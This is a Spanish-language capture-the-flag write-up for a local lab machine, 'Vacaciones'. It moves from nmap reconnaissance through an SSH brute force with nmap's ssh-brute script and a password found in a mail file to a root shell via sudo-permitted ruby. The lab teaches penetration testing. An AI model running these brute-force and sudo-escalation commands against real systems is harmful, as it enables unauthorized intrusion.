- Tags: #Vacaciones
---
[Maquina vacaciones](https://mega.nz/file/YCEGAISD#y6iWUG_auH4vUApClb9ix7H6JmOCKm4vAYS2TjQn59g) ==> Enlace de descarga al laboratorio.
```bash
 7z x vacaciones.zip # Descomprimimos el archivo
sudo bash auto_deploy.sh vacaciones.tar # Desplegamos el laboratorio
```
---

#### Fase Reconocimiento
```bash
ping -c 1 172.17.0.2 # Realizamos una traza ICMP para ver si tenemos comunicacion con el target

wichSystem.py 172.17.0.2 # Determinamos que estamos ante una maquina linux
172.17.0.2 (ttl -> 64): Linux
```
---

#### Fase Reconocimiento Puertos:
```bash
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts # Realizamos descubrimiento de puertos en el target
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```
---
- **( 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) )** ==> Tenemos una version ssh expueste y no actualizada,
```bash
searchsploit ssh 7.6 # Tenemos posibles exploits que nos permitirian uan posible enumeracion de usarios validos.
nmap -p80 --script http-enum 172.17.0.2 # No reporta nada craitico
```
- **( 80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu)) )** ==> Tenemos un servicio de apache expuesto por el puerto 80.

#### Fase Reconocimiento Web:
- **( http://172.17.0.2/ )** ==> Tenemos este servicio web que no vemos nada de inicio
- **( ctrl + u )** ==> Revisamos el codigo fuente encontrando esto:
```bash
<!-- De : Juan Para: Camilo , te he dejado un correo es importante... -->
```
---
- **Nota** ==> Tenemos dos potenciales usuarios que despues podemos auditar. la parte de rutas y subdirectorios no encontramos nada relevante, 
```bash
nmap -p 22 --script ssh-brute --script-args userdb=users.txt 172.17.0.2   # Realizamos fuera bruta a los posibles usuario que encontramos logrando encontrar una credencial ssh valida.
camilo:password1 - Valid credentials
```
---
- Inciaremos la conexion por **ssh**
```bash
ssh-keygen -R 172.17.0.2 && ssh camilo@172.17.0.2 # Despues proporcionamos la password
```
---
- **( camilo )** ==> Ahora estamos logueados como el usuario camilo, Realizamos tratamiento de la tty
```bash
script /dev/null -c bash
```
---

#### Escalda de privilegios
```bash
sudo -l # No tenemos permisos Sudoers

/var/mail/camilo # Aqui buscamos el supuesto correo
correo.txt # Revisamos el contenido del correo, que nos proporciona una password. 
2k84dicb # Password
```
---
- Con esta password ahora podemos migrar al usuario **juan** para ahora con este usuari enumerar el sistema.
```bash
sudo -l # Ahora si que tenemos permiso sudoers
User juan may run the following commands on fe9555520203:
    (ALL) NOPASSWD: /usr/bin/ruby
```
---
- Explotaremos este binario para elevar nuestros privilegios a **root**
```bash
sudo -u root /usr/bin/ruby -e 'exec "/bin/bash"' # Ahora somos root
```